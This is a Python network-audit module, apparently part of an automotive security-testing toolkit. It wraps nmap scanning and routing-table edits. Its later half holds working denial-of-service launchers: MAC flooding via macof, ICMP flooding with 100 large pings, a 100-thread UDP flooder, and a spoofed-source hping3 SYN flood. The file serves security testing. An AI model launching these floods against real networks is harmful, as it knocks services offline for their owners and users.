import logging
logger = logging.getLogger(__name__)

import os
from sat_toolkit.tools.bash_script_engine import Bash_Script_Mgr
from sat_toolkit.tools.sat_utils import *
import xml.etree.ElementTree as ET

import threading
import socket
import random

class _DUPFloodThread(threading.Thread):
    def __init__(self, ip, port, size):
        super().__init__()
        self.ip = ip
        self.port = port
        self.buffer = b'\xAA' * size
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        self.running = True
        logger.info("UDP Flood Thread Inited! IP:{} Port:{} BUffer_Size:{}".format(ip, port, size))

    def run(self):
        while self.running:
            if self.port == 0:
                port = random.randint(1, 65535)
            else:
                port = self.port
            self.sock.sendto(self.buffer, (self.ip, port))
        self.sock.close()

    def stop(self):
        logger.info("UDP Flood Thread Stop IP:{} Port:{}".format(self.ip, self.port))
        self.running = False


class NetAudit_Mgr:
    #TODO  flood攻击的脚本 改为多进程同时攻击，使用pkill或者killall直接一次性杀掉
    __nmap_output_file_path = "/dev/shm/__Zeekr_SAT_TMP_FILES/nmap_output/nmap_audit_result.xml"

    @staticmethod
    def Instance():
        return _instance
        
    def __init__(self):
        os.makedirs(os.path.dirname(NetAudit_Mgr.__nmap_output_file_path), exist_ok=True)

        self.__pid_dict = {}

        pass

    def ip_detect(self, host_list):
        """
        活跃主机探测 参考'nmap -sn 192.168.1.1'
        ip_list = NetAudit_Mgr().Instance().ip_detect(["198.18.0.0/16"])
        ip_list = NetAudit_Mgr().Instance().ip_detect(["198.18.36.1", "198.18.32.1", "198.18.32.17","198.18.34.1"])
        

        Return:
        None:探测失败
        [{'ip': '192.168.8.150', 'status': 'up.'}]
        """

        logger.info("IP Detect '{}' Start -->>".format(host_list))
        result_code, result_buf = Bash_Script_Mgr.Instance().exec_cmd("sudo nmap -sn {}".format(' '.join(host_list)))
        if result_code < 0:
            raise_err("IP Detect '{}' Fail.".format(host_list))
            return None
        """
        Starting Nmap 7.91 ( https://nmap.org ) at 2021-10-01 14:15 PDT
        Nmap scan report for 192.168.1.1
        Host is up (0.0027s latency).
        MAC Address: 11:22:33:44:55:66 (Some manufacturer)

        Nmap done: 1 IP address (1 host up) scanned in 0.09 seconds
        """
        ip_list = []
        for line in result_buf.splitlines():
            if line.startswith("Nmap scan report for "):
                ip_dict = {}
                ip_dict["ip"] = line.replace("Nmap scan report for ", "")
                # ip_list.append(ip_dict)
                ip_list.append(ip_dict["ip"])
            if line.startswith("Host is "):
                ip_dict["status"] = line.replace("Host is ", "").split(" ")[0]
        
        logger.info("IP Detect '{}' Finish. Result:\n{}".format(host_list, ip_list))
        return ip_list

    def port_detect(self, host_list, port_list):
        """
        活跃端口探测 参考'nmap -p 80,443,8080,8888,9999 192.168.1.100 192.168.1.200'
        ip_list = NetAudit_Mgr().Instance().port_detect(["198.18.32.17","198.18.32.16"], [89,443])

        Return:
        None:探测失败

        [{'IP': '192.168.8.146', 'Port': {'89': {'protocol': 'tcp', 'state': 'closed', 'service': 'su-mit-tg'}, '443': {'protocol': 'tcp', 'state': 'closed', 'service': 'https'}}}, {'IP': '192.168.8.150', 'Port': {'89': {'protocol': 'tcp', 'state': 'closed', 'service': 'su-mit-tg'}, '443': {'protocol': 'tcp', 'state': 'closed', 'service': 'https'}}}]
        """

        logger.info("Port Detect '{}' IN '{}' Start -->>".format(port_list, host_list))
        # port_str_list = [str(num) for num in port_list]
        result_code, result_buf = Bash_Script_Mgr.Instance().exec_cmd(
            "sudo nmap -vv -sT -T2 -p {} {} -oX {}".format(port_list, ' '.join(host_list), NetAudit_Mgr.__nmap_output_file_path)
        )
        if result_code < 0:
            logger.error("Port Detect '{}' IN '{}' Fail!".format(port_list, host_list))
            return None
        """
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE nmaprun>
<?xml-stylesheet href="file:///usr/share/nmap/nmap.xsl" type="text/xsl"?>
<!-- Nmap 7.80 scan initiated Fri Nov 26 02:07:45 2021 as: nmap -p 80,443,8080,8888,9999 -oX scan.xml 192.168.1.100 192.168.1.200 -->
<nmaprun scanner="nmap" args="nmap -p 80,443,8080,8888,9999 -oX scan.xml 192.168.1.100 192.168.1.200" start="1637900865" startstr="Fri Nov 26 02:07:45 2021" version="7.80" xmloutputversion="1.04">
    <scaninfo type="syn" protocol="tcp" numservices="5" services="80, 443, 8080, 8888, 9999"/>
    <verbose level="0"/>
    <debugging level="0"/>
    <host starttime="1637900865" endtime="1637900865">
        <status state="up" reason="arp-response" reason_ttl="0"/>
        <address addr="192.168.1.100" addrtype="ipv4"/>
        <ports>
            <port protocol="tcp" portid="80">
                <state state="open" reason="syn-ack" reason_ttl="64"/>
                <service name="http" product="Apache httpd" version="2.4.7" extrainfo="(Ubuntu)" ostype="Linux" method="probed" conf="10"/>
            </port>
            <port protocol="tcp" portid="443">
                <state state="open" reason="syn-ack" reason_ttl="64"/>
                <service name="https" product="Apache httpd" version="2.4.7" extrainfo="(Ubuntu)" ostype="Linux" method="probed" conf="10"/>
            </port>
            <port protocol="tcp" portid="8080">
                <state state="open" reason="syn-ack" reason_ttl="64"/>
                <service name="http-proxy" method="probed" conf="10"/>
            </port>
            <port protocol="tcp" portid="8888">
                <state state="closed" reason="reset" reason_ttl="64"/>
            </port>
            <port protocol="tcp" portid="9999">
                <state state="closed" reason="reset" reason_ttl="64"/>
            </port>
        </ports>
        <times srtt="5311" rttvar="2632" to="100000"/>
    </host>
    <host starttime="1637900865" endtime="1637900865">
        <status state="up" reason="arp-response" reason_ttl="0"/>
        <address addr="192.168.1.200" addrtype="ipv4"/>
        <ports>
            <port protocol="tcp" portid="80">
                <state state="open" reason="syn-ack" reason_ttl="64"/>
                <service name="http" product="lighttpd" version="1.4.33" extrainfo="redmine 2.6.1.stable" ostype="Linux" method="probed" conf="10"/>
            </port>
            <port protocol="tcp" portid="443">
                <state state="closed" reason="reset" reason_ttl="64"/>
            </port>
            <port protocol="tcp" portid="8080">
                <state state="closed" reason="reset" reason_ttl="64"/>
            </port>
            <port protocol="tcp" portid="8888">
                <state state="closed" reason="reset" reason_ttl="64"/>
            </port>
            <port protocol="tcp" portid="9999">
                <state state="closed" reason="reset" reason_ttl="64"/>
            </port>
        </ports>
        <times srtt="987" rttvar="358" to="100000"/>
    </host>
    <runstats>
        <finished time="1637900865" timestr="Fri Nov 26 02:07:45 2021" elapsed="0.03" summary="Nmap done at Fri Nov 26 02:07:45 2021; 2 IP addresses (2 hosts up) scanned in 0.03 seconds" exit="success"/>
        <hosts up="2" down="0" total="2"/>
    </runstats>
</nmaprun>
        """
        
        tree = ET.parse(NetAudit_Mgr.__nmap_output_file_path)
        root = tree.getroot()
        results = []
        for host in root.iter('host'):
            ip = host.find('address').attrib['addr']
            ports = {}
            for port in host.iter('port'):
                # port_info = {
                #     'protocol' : port.attrib['protocol'],
                #     'state' : port.find('state').attrib['state'],
                #     # 'service' : port.find('service').attrib.get('name') or 'Unknown',
                # }
                # ports[port.attrib['portid']] = port_info
                state = port.find('state').attrib['state']
                portnum = port.attrib['portid']
                if state == "open":
                    results.append({"ip":ip,"port":portnum})

            # results.append({'IP': ip, 'Port': ports})     

        logger.info("IP Detect '{}' Finish. Result:\n{}".format(host_list, results))
        return results

    def read_route(self):
        """
        查看SAT路由表
        NetAudit_Mgr().Instance().read_route()

        Return:
        Kernel IP routing table
        Destination     Gateway         Genmask         Flags Metric Ref    Use Iface
        default         192.168.8.1     0.0.0.0         UG    600    0        0 wlan0
        link-local      0.0.0.0         255.255.0.0     U     0      0        0 eth0
        192.168.8.0     0.0.0.0         255.255.255.0   U     600    0        0 wlan0
        """        
        logger.info("Read SAT Route Table Start -->>")
        result_code, result_buf = Bash_Script_Mgr.Instance().exec_cmd("route -v")
        if result_code < 0:
            logger.error("Read SAT Route Table Fail! Bash CMD Fail!")
            return None
        
        logger.info("Read SAT Route Table Finish. Result:\n{}".format(result_buf))
        
        return result_buf

    def modify_route(self, route_info:list):
        """
        修改SAT路由表
        INPUT:
        [
            {
                "ops":"add",
                "destination":"198.18.0.0/24",
                "gateway":"192.168.8.1",
            },
            {
                "ops":"del",
                "destination":"198.18.0.0/24",
            },
        ]
        Return:
        -1:Fail
        1 :Success 
        """     
        logger.info("Modify SAT Route Table Start -->>")
        cmd_list = ""
        for route_cmd in route_info:
            if route_cmd.get("ops") == "add":
                cmd_list += "sudo ip table add {} via {}\n".format(route_cmd.get("destination"), route_cmd.get("gateway"))
            elif route_cmd.get("ops") == "del":
                cmd_list += "sudo ip table del {} \n".format(route_cmd.get("destination"))
            else:
                logger.error("Cmd Not Support! Ignore This Cmd:{}.".format(route_cmd))

        result_code, result_buf = Bash_Script_Mgr.Instance().exec_cmd(cmd_list)
        if result_code < 0:
            logger.error("Modify SAT Route Table Fail! Bash CMD Fail!")
            return -1
        
        if len(result_buf) != 0:
            logger.error("Modify SAT Route Table Fail! Cmd Exec Fail:\n{}".format(result_buf))
            return -1
        
        logger.info("Modify SAT Route Table Finish.")
        return 1
        
#=============
    def start_mac_flood_attack(self, target_ip:str, interface_name="wlan0"):
        """
        开始发送MAC泛洪攻击 参考' macof -i eth0 -d [gateway IP]'
        ip_list = NetAudit_Mgr().Instance().start_mac_flood_attack("192.168.8.146")

        Return:
        """
        self.stop_mac_flood_attack()
        logger.info("MAC Flood Attack '{}' On '{}' Start -->>".format(target_ip, interface_name))
        Bash_Script_Mgr.Instance().exec_cmd("sudo macof -i {} -d {} &> /dev/null &".format(interface_name, target_ip))
        
    def stop_mac_flood_attack(self):
        """
        停止发送MAC泛洪攻击

        Return:
        """
        Bash_Script_Mgr.Instance().exec_cmd("sudo pkill -9 macof")
        
        return 1

#=============
    def start_icmp_flood_attack(self, target_ip:str):
        """
        开始发送ICMP泛洪攻击 参考'ping 192.168.1.1 -s 65500'
        ip_list = NetAudit_Mgr().Instance().start_icmp_flood_attack("192.168.8.146")

        Return:
        """
        self.stop_icmp_flood_attack()
        logger.info("ICMP Flood Attack '{}' Start -->>".format(target_ip))
        for i in range(0,100):
            Bash_Script_Mgr.Instance().exec_cmd("sudo ping {} -s 65500 &> /dev/null &".format(target_ip))


    def stop_icmp_flood_attack(self):
        """
        停止发送ICMP泛洪攻击

        Return:
        """
        result_code, result_buf = Bash_Script_Mgr.Instance().exec_cmd("sudo pkill -9 ping")
        return 1

#=============
    def start_udp_flood_attack(self, target_ip:str, target_port=0, buffer_size = 128):
        """
        开始发送UDP泛洪攻击
        NetAudit_Mgr().Instance().start_udp_flood_attack("192.168.8.146")

        Return:
        """
        self.stop_udp_flood_attack()

        logger.info("Start UDP Flood Attack. -->>")
        for i in range(0,100):
            thread_ctx = _DUPFloodThread(target_ip, target_port, buffer_size)
            thread_ctx.start()
            self.__pid_dict["udp_flood_attack_thread_list"].append(thread_ctx)

        logger.info("Start UDP Flood Attack Success.")
        return 1


    def stop_udp_flood_attack(self):
        """
        停止发送UDP泛洪攻击

        Return:
        """
        thread_ctx_list = self.__pid_dict.get("udp_flood_attack_thread_list")
        if thread_ctx_list == None:
            self.__pid_dict["udp_flood_attack_thread_list"] = []
            logger.info("No Running UDP Flood Attack. Stop Cancaled.")
            return -1
        
        for thread_ctx in thread_ctx_list:
            logger.info("Stop UDP Flood Attack. ctx:{} -->>".format(thread_ctx))
            thread_ctx.stop()
            thread_ctx.join()

        self.__pid_dict["udp_flood_attack_thread_list"] = []
        logger.info("Stop UDP Flood Attack Success.")
        return 1

#=============
    def start_tcp_flood_attack(self, target_ip:str):
        """
        开始发送TCP泛洪攻击 参考'hping3 -V -c 1000000 -d 120 -S -w 64 -p 445 -s 445 --flood --rand-source {target}'
        ip_list = NetAudit_Mgr().Instance().start_tcp_flood_attack("192.168.8.146")
        Return:
        """
        self.stop_tcp_flood_attack()
        logger.info("TCP Flood Attack '{}' Start -->>".format(target_ip))
        # for i in range(0,100):
        Bash_Script_Mgr.Instance().exec_cmd("sudo hping3 -V -d 120 -S -w 64 -p 445 -s 445 --flood --rand-source {} &> /dev/null &".format(target_ip))
        return 1
    
    def stop_tcp_flood_attack(self):
        """
        停止发送TCP泛洪攻击
        Return:
        """
        Bash_Script_Mgr.Instance().exec_cmd("sudo pkill -9 hping3")
        time.sleep(1)
        Bash_Script_Mgr.Instance().exec_cmd("sudo pkill -9 hping3")
        return 1



_instance = NetAudit_Mgr()

